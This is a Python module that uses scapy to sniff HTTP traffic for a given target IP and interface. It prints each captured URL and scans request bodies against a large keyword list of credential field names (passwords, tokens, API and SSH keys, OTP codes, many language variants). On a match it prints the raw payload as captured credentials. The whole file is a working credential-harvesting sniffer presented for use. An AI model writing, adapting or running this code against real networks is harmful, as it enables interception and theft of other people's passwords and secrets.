import scapy.all as scapy
from scapy.layers import http
import time
from colorama import Fore, Style, init

init(autoreset=True)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            payload = load.decode(errors="ignore").lower()
            try:
                host = packet[http.HTTPRequest].Host.decode(errors="ignore")
            except Exception:
                host = ""
            try:
                path = packet[http.HTTPRequest].Path.decode(errors="ignore")
            except Exception:
                path = ""
            url = host + path
            print(Fore.CYAN + f"[+] Captured URL: {url}")

            keywords = [
                # generic
                "login", "log_in", "log-in", "signin", "sign_in", "sign-in", "signon", "sign_on", "sign-on",
                "authenticate", "authentication", "auth", "credentials", "credential",
                "account", "acct", "account_id", "accountid",
                # username fields
                "username", "user_name", "user-name", "user", "usr", "userid", "user_id", "userId", "userLogin",
                "userlogin", "user_login", "login_user", "login_username", "loginid", "login_id",
                "email", "e-mail", "email_address", "emailaddress", "user_email", "useremail",
                "mail", "contact", "member", "memberid", "member_id", "handle", "screenname", "screen_name",
                # password fields
                "password", "pass", "passwd", "pwd", "passcode", "pass_word", "pass-word",
                "password1", "password2", "pwd1", "pwd2", "new_password", "newpass", "new_pass",
                "old_password", "oldpass", "confirm_password", "password_confirm", "password_confirmation",
                "confirm_pass", "confirm_pwd", "repassword", "re_pass", "repeat_password",
                "master_password", "masterpass", "login_password", "user_password", "admin_password", "admin_pass",
                # common framework / form names
                "userName", "user_id", "userID", "UserName", "passWord", "passwordHash",
                "passwd1", "passwd2", "pwd_confirm", "pwd_confirmed", "password_field",
                "auth_token", "token", "access_token", "refresh_token", "session_token", "csrf_token",
                "secret", "secret_key", "secretkey", "client_secret", "client_secret_key",
                "api_key", "apikey", "apiKey", "api_secret", "api_token",
                "key", "key_id", "keyid", "private_key", "privateKey", "ssh_key", "ssh_private_key",
                "passphrase", "pin", "otp", "one_time_password", "one_time_pass", "verification_code",
                "mfa", "two_factor", "twofactor", "2fa", "tfa", "security_answer",
                # admin / service related
                "admin", "administrator", "root_password", "root_pass", "sysadmin_password",
                "db_password", "dbpass", "database_password", "database_pass", "sql_password",
                "smtp_password", "imap_password", "ftp_password", "ftp_pass",
                # common short / misc
                "pw", "pw1", "pw2", "secret_token", "auth_token", "authkey", "auth_key",
                "credentials_json", "credentials_file", "login_token", "login_hash",
                # language variants (common)
                "motdepasse", "senha", "contrasena", "contraseña", "parola", "passwort", "lösenord", "sifre", "haslo", "passworden",
                "كلمة_السر", "كلمةالسر", "كلمة-السر", "كلمة السر", "باسورد", "باس_ورد",
                "اسم_المستخدم", "اسم_المستخدم_", "مستخدم", "مستخدم_اسم",
                # mobile/app specific
                "phone", "phone_number", "mobile", "mobile_number", "msisdn", "tel",
                "pin_code", "passcode", "mpin",
                # framework / CMS specific
                "wp_password", "wp_pass", "admin_pass", "administrator_password",
                "drupal_pass", "joomla_password",
                # developer / misc
                "hashed_password", "password_hash", "hash", "salt", "password_salt",
                "auth_hash", "digest", "oauth_token", "oauth_verifier", "oauth_consumer_key",
                "consumer_secret", "client_id", "clientid",
                # UI labels
                "username_or_email", "email_or_username", "login_or_email", "user_or_email",
                "user-name", "user.name", "user.name.login",
                # confirmation & recovery
                "reset_password", "forgot_password", "forgot_pass", "password_reset", "reset_token",
                "security_question", "security_answer", "recovery_email", "recovery_phone",
                # extra variants and typos
                "passwords", "passw", "passwrd", "pasword", "pswd", "passw0rd", "p@ssword",
                "usern", "usrname", "usernm", "usernap", "userloginid", "logon", "logon_id",
                # JSON/API style keys
                "userId", "user_id", "usernameField", "passwordField", "authToken", "accessToken",
                "refreshToken", "access_token_secret", "token_secret",
                # enterprise / SSO / identity
                "sso_token", "sso", "saml_response", "saml_assertion", "id_token", "idp_response",
                "identity", "identity_token",
                # telemetry / config keys
                "secretValue", "secretValueText", "privateToken", "svc_password", "service_password"
            ]
            for keyword in keywords:
                if keyword.lower() in payload:
                    print(Fore.YELLOW + f"[!] Possible credentials found: {load}")
                    break

def run_packet_sniff(interface, target_ip, duration, http_only, stop_event):
    try:
        print(Fore.GREEN + f"[+] Starting packet sniffing on {interface} for {duration} seconds...")
        filter_str = f"port 80 and host {target_ip}" if http_only else f"host {target_ip}"
        scapy.sniff(
            iface=interface,
            store=False,
            prn=process_sniffed_packet,
            filter=filter_str,
            timeout=duration,
            stop_filter=lambda x: stop_event.is_set()
        )
        print(Fore.GREEN + "[+] Packet sniffing completed.")
    except Exception as e:
        print(Fore.RED + f"[-] Error in packet sniffing: {e}")
